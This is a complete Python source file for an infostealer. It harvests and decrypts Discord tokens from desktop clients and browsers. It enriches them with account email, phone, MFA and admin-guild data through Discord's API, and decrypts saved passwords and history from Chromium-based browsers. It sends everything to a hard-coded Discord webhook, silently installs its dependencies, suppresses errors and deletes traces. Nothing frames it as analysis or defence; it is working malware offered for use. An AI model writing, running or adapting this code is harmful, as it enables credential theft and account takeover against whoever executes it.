import base64
import json
import os
import shutil
import sqlite3
import subprocess
import sys
import tempfile
import time
import re
from datetime import datetime, timedelta
from pathlib import Path
from typing import List, Dict, Optional, Tuple, Any
from contextlib import contextmanager

try:
    import win32crypt
except ImportError:
    win32crypt = None

try:
    from Crypto.Cipher import AES
except ImportError:
    AES = None

try:
    import requests
except ImportError:
    requests = None

WEBHOOK_URL = "https://discord.com/api/webhooks/1573431708764741663/e_ro6yWqP7AOSo4UOvbZ73Qts8z62mjezkf8zO3eWzs8mU142S42LAxCLHsnX5XbjI5R"  # Replace with your actual Discord webhook URL

class DependencyInjector:
    REQUIRED_MODULES = [
        ("win32crypt", "pypiwin32"),
        ("Crypto.Cipher", "pycryptodome"),
        ("requests", "requests"),
    ]
    
    @staticmethod
    def ensure_dependencies():
        for module, pip_name in DependencyInjector.REQUIRED_MODULES:
            try:
                __import__(module)
            except ImportError:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", pip_name, "--quiet", "--no-cache-dir"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                time.sleep(0.3)

class ShadowConfig:
    WEBHOOK_URL = WEBHOOK_URL
    
    @staticmethod
    def get_appdata():
        return os.getenv('LOCALAPPDATA', os.path.expanduser("~/.local/share"))
    
    @staticmethod
    def get_roaming():
        return os.getenv('APPDATA', os.path.expanduser("~/.config"))
    
    APP_DATA = get_appdata.__func__()
    ROAMING = get_roaming.__func__()
    
    DISCORD_PATHS = {
        'Discord': ROAMING + '\\discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Discord PTB': ROAMING + '\\discordptb',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
        'Chrome': APP_DATA + "\\Google\\Chrome\\User Data\\Default",
        'Brave': APP_DATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Edge': APP_DATA + '\\Microsoft\\Edge\\User Data\\Default',
        'Vivaldi': APP_DATA + '\\Vivaldi\\User Data\\Default',
        'Yandex': APP_DATA + '\\Yandex\\YandexBrowser\\User Data\\Default',
    }
    
    BROWSER_PATHS = {
        'chrome': APP_DATA + '\\Google\\Chrome\\User Data',
        'brave': APP_DATA + '\\BraveSoftware\\Brave-Browser\\User Data',
        'edge': APP_DATA + '\\Microsoft\\Edge\\User Data',
        'vivaldi': APP_DATA + '\\Vivaldi\\User Data',
        'yandex': APP_DATA + '\\Yandex\\YandexBrowser\\User Data',
        'opera': ROAMING + '\\Opera Software\\Opera Stable',
        'opera-gx': ROAMING + '\\Opera Software\\Opera GX Stable',
        'chromium': APP_DATA + '\\Chromium\\User Data',
    }
    
    DATA_QUERIES = {
        'credentials': {
            'query': 'SELECT action_url, username_value, password_value FROM logins',
            'file': '\\Login Data',
            'columns': ['URL', 'Username', 'Password'],
            'decrypt': True
        },
        'history': {
            'query': 'SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500',
            'file': '\\History',
            'columns': ['URL', 'Title', 'Last Visit'],
            'decrypt': False
        }
    }
    
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    ]

def stealth_retry(max_attempts=3, delay=1.0):
    def decorator(func):
        def wrapper(*args, **kwargs):
            for attempt in range(max_attempts):
                try:
                    result = func(*args, **kwargs)
                    if result is not None:
                        return result
                except Exception:
                    if attempt < max_attempts - 1:
                        time.sleep(delay * (2 ** attempt))
            return None
        return wrapper
    return decorator

def silent_fallback(default_value=None):
    def decorator(func):
        def wrapper(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception:
                return default_value
        return wrapper
    return decorator

class DiscordExfiltrator:
    def __init__(self, webhook_url=ShadowConfig.WEBHOOK_URL):
        self.webhook_url = webhook_url
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": ShadowConfig.USER_AGENTS[0],
            "Accept": "application/json",
        })
    
    @stealth_retry(3, 0.5)
    def send_file(self, file_path, filename, content=None):
        if not self.webhook_url:
            return False
        
        try:
            if content is None:
                with open(file_path, 'rb') as f:
                    file_data = f.read()
            else:
                file_data = content.encode('utf-8')
            
            files = {'file': (filename, file_data, 'text/plain')}
            payload = {
                "content": f"Data collected on {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}",
                "username": "Collector",
            }
            
            response = self.session.post(self.webhook_url, data=payload, files=files, timeout=30)
            return response.status_code in (200, 204)
        except Exception:
            return False
    
    @stealth_retry(3, 1.0)
    def send_embed(self, embed_data):
        if not self.webhook_url:
            return False
        
        try:
            response = self.session.post(
                self.webhook_url,
                json=embed_data,
                timeout=30
            )
            return response.status_code in (200, 204)
        except Exception:
            return False

class TokenHarvester:
    def __init__(self):
        self.validated_tokens = set()
        self.exfiltrator = DiscordExfiltrator()
    
    @silent_fallback([])
    def extract_tokens_from_leveldb(self, client_path):
        db_path = Path(client_path) / "Local Storage" / "leveldb"
        if not db_path.exists():
            return []
        
        tokens = []
        token_pattern = re.compile(r"dQw4w9WgXcQ:[^\"]+")
        
        for file in list(db_path.glob("*.ldb")) + list(db_path.glob("*.log")):
            try:
                with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        matches = token_pattern.findall(line)
                        tokens.extend(matches)
            except (PermissionError, IOError):
                continue
        
        return list(set(tokens))
    
    @silent_fallback(None)
    def decrypt_token(self, encrypted_token, master_key):
        try:
            if not encrypted_token.startswith('dQw4w9WgXcQ:'):
                return encrypted_token
            
            raw_token = encrypted_token.split('dQw4w9WgXcQ:')[1]
            encrypted = base64.b64decode(raw_token)
            
            if len(encrypted) < 15:
                return None
            
            iv = encrypted[3:15]
            ciphertext = encrypted[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(ciphertext)[:-16]
            return decrypted.decode('utf-8')
        except Exception:
            return None
    
    @silent_fallback(None)
    def get_master_key(self, path):
        local_state = Path(path) / "Local State"
        if not local_state.exists():
            return None
        
        with open(local_state, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        if 'os_crypt' not in data:
            return None
            
        enc_key = base64.b64decode(data['os_crypt']['encrypted_key'])[5:]
        if win32crypt is None:
            return None
            
        return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    
    def harvest_tokens(self):
        for client_name, client_path in ShadowConfig.DISCORD_PATHS.items():
            if not Path(client_path).exists():
                continue
            
            tokens = self.extract_tokens_from_leveldb(client_path)
            if not tokens:
                continue
            
            master_key = self.get_master_key(client_path)
            if not master_key:
                continue
            
            for encrypted_token in tokens:
                try:
                    decrypted = self.decrypt_token(encrypted_token, master_key)
                    if not decrypted or decrypted in self.validated_tokens:
                        continue
                    
                    if self.validate_token(decrypted):
                        self.validated_tokens.add(decrypted)
                        self.process_valid_token(decrypted, client_name)
                except Exception:
                    continue
    
    @silent_fallback(False)
    def validate_token(self, token):
        headers = {"Authorization": token, "User-Agent": ShadowConfig.USER_AGENTS[0]}
        try:
            response = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=10)
            return response.status_code == 200
        except Exception:
            return False
    
    def process_valid_token(self, token, source):
        try:
            headers = {"Authorization": token, "User-Agent": ShadowConfig.USER_AGENTS[0]}
            
            user_resp = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=10)
            if user_resp.status_code != 200:
                return
            user_data = user_resp.json()
            
            guild_resp = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers, timeout=10)
            guilds = guild_resp.json() if guild_resp.status_code == 200 else []
            
            admin_guilds = []
            for g in guilds:
                try:
                    perms = int(g.get('permissions', 0))
                    if perms & 8 or perms & 32:
                        admin_guilds.append(g)
                except (ValueError, TypeError):
                    continue
            
            guild_info = "\n".join([f"{g['name']} (ID: {g['id']})" for g in admin_guilds[:10]])
            
            nitro_resp = requests.get("https://discord.com/api/v10/users/@me/billing/subscriptions", headers=headers, timeout=10)
            has_nitro = nitro_resp.status_code == 200 and len(nitro_resp.json()) > 0
            
            embed = {
                "embeds": [{
                    "title": f"Token Found: {user_data.get('username', 'Unknown')}",
                    "color": 0x5865F2,
                    "fields": [
                        {"name": "ID", "value": user_data.get('id', 'N/A'), "inline": True},
                        {"name": "Email", "value": user_data.get('email', 'N/A'), "inline": True},
                        {"name": "Phone", "value": user_data.get('phone', 'N/A'), "inline": True},
                        {"name": "MFA", "value": str(user_data.get('mfa_enabled', False)), "inline": True},
                        {"name": "Verified", "value": str(user_data.get('verified', False)), "inline": True},
                        {"name": "Nitro", "value": "Yes" if has_nitro else "No", "inline": True},
                        {"name": "Admin Guilds", "value": guild_info or "None", "inline": False},
                        {"name": "Token", "value": f"`{token}`", "inline": False},
                        {"name": "Source", "value": source, "inline": True},
                    ],
                    "footer": {"text": f"Exfiltrated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
                }]
            }
            
            self.exfiltrator.send_embed(embed)
            
        except Exception:
            pass

class BrowserDataExtractor:
    def __init__(self):
        self.exfiltrator = DiscordExfiltrator()
        self._key_cache = {}
    
    @silent_fallback(None)
    def get_master_key(self, browser_path):
        if browser_path in self._key_cache:
            return self._key_cache[browser_path]
        
        try:
            local_state = Path(browser_path) / "Local State"
            if not local_state.exists():
                return None
                
            with open(local_state, 'r', encoding='utf-8') as f:
                state = json.load(f)
                
            if 'os_crypt' not in state:
                return None
                
            enc_key = base64.b64decode(state['os_crypt']['encrypted_key'])[5:]
            if win32crypt is None:
                return None
                
            key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
            self._key_cache[browser_path] = key
            return key
        except Exception:
            return None
    
    def decrypt_password(self, encrypted, key):
        if not isinstance(encrypted, bytes) or not encrypted:
            return ""
        
        try:
            if encrypted.startswith(b'v10') or encrypted.startswith(b'v11'):
                iv = encrypted[3:15]
                ciphertext = encrypted[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(ciphertext)[:-16]
                return decrypted.decode('utf-8', errors='ignore')
            else:
                if win32crypt is not None:
                    try:
                        return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                    except Exception:
                        pass
                return ""
        except Exception:
            return ""
    
    def safe_decode(self, value):
        if value is None:
            return "N/A"
        if isinstance(value, bytes):
            try:
                decoded = value.decode('utf-8', errors='ignore')
                if decoded and not decoded.startswith('v10') and not decoded.startswith('v11'):
                    return decoded
                return value.hex()[:50]
            except:
                return str(value)
        return str(value)
    
    @contextmanager
    def temp_db_copy(self, db_path):
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
        temp_path = temp_file.name
        temp_file.close()
        
        try:
            shutil.copy2(db_path, temp_path)
            yield temp_path
        finally:
            try:
                os.unlink(temp_path)
            except Exception:
                pass
    
    @silent_fallback([])
    def query_database(self, db_path, query):
        if not Path(db_path).exists():
            return []
        
        try:
            with self.temp_db_copy(db_path) as temp_path:
                conn = sqlite3.connect(temp_path)
                conn.text_factory = bytes
                cursor = conn.cursor()
                cursor.execute(query)
                results = cursor.fetchall()
                conn.close()
                return results
        except Exception:
            return []
    
    def extract_browser_data(self, browser_name, browser_path, data_type):
        if not Path(browser_path).exists():
            return None
        
        master_key = self.get_master_key(browser_path)
        if not master_key:
            return None
        
        profile_path = browser_path
        if "\\" in browser_path and not browser_name in ['opera', 'opera-gx']:
            profile_path = str(Path(browser_path) / "Default")
        
        db_file = profile_path + data_type['file']
        if not Path(db_file).exists():
            return None
        
        results = self.query_database(db_file, data_type['query'])
        if not results:
            return None
        
        decrypted_rows = []
        for row in results:
            try:
                row = list(row)
                
                if data_type['decrypt']:
                    for i, field in enumerate(row):
                        if i == 2 and isinstance(field, bytes) and field:
                            decrypted = self.decrypt_password(field, master_key)
                            row[i] = decrypted if decrypted else "[NO_PASSWORD]"
                        else:
                            row[i] = self.safe_decode(field)
                else:
                    for i, field in enumerate(row):
                        row[i] = self.safe_decode(field)
                
                formatted = []
                for col, val in zip(data_type['columns'], row):
                    formatted.append(f"{col}: {val}")
                decrypted_rows.append("\n".join(formatted))
            except Exception:
                continue
        
        if decrypted_rows:
            return {"entries": decrypted_rows, "count": len(decrypted_rows)}
        return None
    
    def run_extraction(self):
        extracted_data = []
        
        for browser_name, browser_path in ShadowConfig.BROWSER_PATHS.items():
            if not Path(browser_path).exists():
                continue
            
            for data_type_name, data_type in ShadowConfig.DATA_QUERIES.items():
                result = self.extract_browser_data(browser_name, browser_path, data_type)
                if result:
                    extracted_data.append(result)
        
        if extracted_data:
            self.exfiltrate_results(extracted_data)
    
    def exfiltrate_results(self, data_chunks):
        current_chunk = []
        current_size = 0
        
        for chunk in data_chunks:
            chunk_text = "\n\n".join(chunk.get("entries", []))
            if current_size + len(chunk_text) > 7500:
                self.send_chunk(current_chunk)
                current_chunk = []
                current_size = 0
            
            current_chunk.append(chunk_text)
            current_size += len(chunk_text)
        
        if current_chunk:
            self.send_chunk(current_chunk)
    
    def send_chunk(self, chunks):
        if not chunks:
            return
        
        content = "\n\n═══════════════════════════════════\n\n".join(chunks)
        filename = f"browser_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt', encoding='utf-8')
        temp_file.write(content)
        temp_file.close()
        
        try:
            self.exfiltrator.send_file(temp_file.name, filename)
        finally:
            try:
                os.unlink(temp_file.name)
            except Exception:
                pass

class ShadowExfiltrator:
    def __init__(self):
        DependencyInjector.ensure_dependencies()
        self.token_harvester = TokenHarvester()
        self.browser_extractor = BrowserDataExtractor()
    
    def execute(self):
        try:
            self.token_harvester.harvest_tokens()
            self.browser_extractor.run_extraction()
            self._cleanup_traces()
        except Exception:
            pass
    
    def _cleanup_traces(self):
        try:
            temp_dir = Path(tempfile.gettempdir())
            for pattern in ["shadow_*.tmp", "*.db", "browser_data_*.txt"]:
                for file in temp_dir.glob(pattern):
                    try:
                        if file.stat().st_size < 1024 * 1024 * 10:
                            file.unlink()
                    except Exception:
                        pass
        except Exception:
            pass

if __name__ == '__main__':
    exfiltrator = ShadowExfiltrator()
    exfiltrator.execute()
